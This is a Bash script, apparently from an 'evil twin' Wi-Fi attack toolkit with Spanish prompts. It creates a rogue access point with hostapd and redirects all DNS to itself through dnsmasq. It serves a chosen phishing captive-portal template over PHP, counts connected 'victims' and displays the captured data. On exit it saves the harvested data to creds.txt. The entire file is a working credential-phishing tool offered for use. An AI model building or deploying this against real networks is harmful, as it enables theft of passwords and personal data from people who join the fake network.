#!/bin/bash
export TERM=xterm
trap ctrl_c INT
function ctrl_c(){
	echo -e " Saliendo..."
	./src/reset.sh ap

	if [ -n "$(/bin/cat ./pages/$pagina/datos.txt 2>&1)" ];then
		/bin/cat ./pages/$pagina/datos.txt 2> /dev/null > creds.txt
		echo "" > ./pages/$pagina/datos.txt
	fi
	exit 0
}

interfaz=$(/bin/cat ./content/interfaz)
echo $interfaz

function configurar_interfaz(){
	echo ". . . . Creando interfaz en modo AP"
	
	iw dev $interfaz interface add ap0 type __ap > /dev/null

	ip addr add 10.10.0.1/24 dev ap0 > /dev/null
	ip link set ap0 up > /dev/null
	sleep 1
	if ! ip link show ap0 > /dev/null 2>&1;then
		echo "Error creando la interfaz"
		exit 1
	fi
}


##############################    datos    ########################################################

function datos_ap(){
	use_ssid=""
	use_channel=""
	indice_pagina=""
	pass="a"
	while [ -z "$use_ssid" ]; do
		echo -ne "\nSSID de la red: " && read -r use_ssid
	done

	while [ -z "$use_channel" ] || [ "$use_channel" -lt 1 ] || [ "$use_channel" -gt 12 ]; do
		echo -ne "\nEspecifique un canal (1-12): " && read -r use_channel
	done

	while [ -n "$pass" ] && { [ "${#pass}" -lt 8 ] || [ "${#pass}" -gt 63 ]; }; do
		echo -ne "\nEspecifique la contraseña (8:63 chars): " && read -r pass
	done

	paginas=()
	for dir in pages/*/; do
		[ -d "$dir" ] && paginas+=("$(basename "$dir")")
	done

	echo -ne "\n====Plantillas Disponibles====\n"
	for i in "${!paginas[@]}"; do
		echo -ne "$i: ${paginas[$i]}\n"
	done

	while [ -z "$indice_pagina" ] || [ "$indice_pagina" -ge "${#paginas[@]}" ] || [ "$indice_pagina" -lt 0 ]; do
		echo -ne "\nPlantilla para el portal cautivo: " && read -r indice_pagina
	done
	pagina=${paginas[$indice_pagina]}
}

##############################    Ataque    ##########################################

function start_ap(){
	echo -e "\n\nCreando el ap"
	echo -e "\n. . . . Matando los procesos que puedan interferir"
	sleep 1

# -- setup --
	systemctl -q stop wpa_supplicant NetworkManager 2> /dev/null
	systemctl -q mask wpa_supplicant NetworkManager 2> /dev/null
	systemctl -q stop systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
	systemctl -q mask systemd-resolved-monitor.socket systemd-resolved-varlink.socket systemd-resolved 2> /dev/null
	sleep 1

	pkill dnsmasq >/dev/null 2>&1
	pkill hostapd >/dev/null 2>&1

# -- config --
	echo -e ". . . . Configurando hostapd"

/bin/cat > content/hostapd.conf << EOF
interface=ap0
driver=nl80211
ssid=$use_ssid
hw_mode=g
channel=$use_channel
macaddr_acl=0
auth_algs=1
EOF
if [ "$pass" != "" ]; then
	echo -e "wpa=2\n" >> content/hostapd.conf
	echo -e "wpa_passphrase=$pass" >> content/hostapd.conf
fi

	
	echo -e ". . . . Configurando dnsmasq"

/bin/cat > content/dnsmasq.conf << EOF
interface=ap0
listen-address=10.10.0.1
dhcp-range=10.10.0.2,10.10.0.30,255.255.255.0,1h
dhcp-option=3,10.10.0.1
address=/#/10.10.0.1
dhcp-authoritative
EOF

# -- start --
	configurar_interfaz

	hostapd content/hostapd.conf > /dev/null &
	sleep 3
	dnsmasq -C content/dnsmasq.conf > /dev/null

	echo -e "\nAp con nombre $use_ssid creado\n"
	sleep 1
}

function hosts_connect(){
	activehosts=0
	datoscap=""
	while true;do
		clear
		echo -e "\n----------------------------------------------------------"
		echo -e "\nVictimas conectadas: $activehosts\n"
		echo -e "\nDatos capturados: $datoscap\n"
		echo -e "----------------------------------------------------------"
		activehosts=$(bash ./utils/hostsconnect.sh | grep -v "10.10.0.1 " | wc -l 2> /dev/null)
		datoscap=$(/bin/cat pages/$pagina/datos.txt 2>/dev/null)
		sleep 2
	done

}

function portal(){
	echo -e ". . . . Configurando portal cautivo"
	sleep 0.5
	pushd pages/$pagina > /dev/null 2>&1
	php -S 10.10.0.1:80 > /dev/null 2>&1 &
	sleep 1
	popd > /dev/null 2>&1
}

################################    Inicio del programa    #############################

clear
datos_ap

start_ap
portal

hosts_connect

